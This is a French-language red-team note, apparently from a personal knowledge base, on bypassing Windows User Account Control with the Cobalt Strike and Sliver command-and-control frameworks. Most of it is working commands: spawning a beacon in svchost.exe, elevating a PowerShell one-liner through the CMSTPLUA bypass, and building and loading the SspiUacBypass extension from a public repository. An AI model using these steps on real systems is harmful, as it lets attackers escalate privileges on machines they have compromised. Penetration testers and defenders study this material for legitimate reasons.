
> [!RAPPEL]
> Le User Account Control (UAC) est un élément clé de la sécurité Windows. Le UAC réduit le risque de programmes malveillants en limitant la capacité du code à s’exécuter avec des privilèges d’administrateur.
> Plusieurs niveaux d'intergrité : Low, Medium, High et System.

> [!Attention]
> Permet d'obtenir plus de privileges (session haute intégrité) mais pas forcement un shell SYSTEM (voir les exploits disponibles).


![[Pasted image 20250913215519.png]]


[[#Cobalt Strike]]
[[#Sliver]]



# Cobalt Strike

Fournit 2 possibilités pour élever ses privilèges en bypassant l'UAC :
- Elevators
- Exploits

Les 2 embarquent des Bypass built-in.

## Elevator

Permet de lancer n'importe quelle commande grâce à runasadmin. (Flexible)

```
runasadmin [exploit] [command] [args]
```

#### Exemple avec CMSTPLUA

> [!Warning]
> Pour fonctionner le processus depuis lequel est lancé le beacon doit se situer dans C:\Windows

1. Lancer un beacon http dans svchost.exe.

```
spawnto x64 "C:\Windows\sysnative\svchost.exe"
```

```
spawn x64 http
```

2. Générer un one liner PowerShell pour obtenir un beacon TCP -> Clique droit sur le beacon -> Access -> One Liner -> Choisir beacon TCP

3. Executer la commande runasadmin avec le One Liner généré

```
runasadmin uac-cmstplua [ONE-LINER]
```

4. Se connecter au beacon TCP, la session devrait apparaitre en haute integrité.

```
connect localhost 1337
```

## Exploit

Spawn une nouvelle session grâce à la commande elevate

```
elevate [exploit] [listener]
```




# Sliver

Extension UAC-BOF-Bonanza à importer
https://github.com/icyguider/UAC-BOF-Bonanza

installer g++-mingw-w64-x86-64, compiler et copier le dossier dans les extensions sliver

```
sudo apt install -y g++-mingw-w64-x86-64 mingw-w64
git clone https://github.com/icyguider/UAC-BOF-Bonanza
cd UAC-BOF-Bonanza/SspiUacBypass
make
cd ..
cp -r SspiUacBypass ~/.sliver-client/extensions
```

Depuis sliver, charger l'extension

```
extensions load ~/.sliver-client/extensions/SspiUacBypass
```

Bypass UAC

```
SspiUacBypass c:/path/to/file.exe
```





ou méthode cmstp https://github.com/0xb11a1/sliver_extension_uac_bypass_cmstp



